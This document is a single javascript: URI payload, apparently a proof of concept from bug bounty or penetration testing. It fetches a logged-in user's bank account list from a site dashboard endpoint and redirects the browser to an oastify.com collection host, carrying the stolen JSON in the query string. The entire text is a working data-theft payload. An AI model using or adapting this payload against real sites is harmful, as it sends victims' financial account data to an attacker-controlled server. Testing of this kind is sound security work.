javascript:fetch('https://www.REDACTED.com/my/dashboard/db_bank_account_list', {referrerPolicy: 'no-referrer'}).then(r=>r.json()).then(d=>location.href=`https://REDACTED.oastify.com?data=${encodeURIComponent(JSON.stringify(d))}`);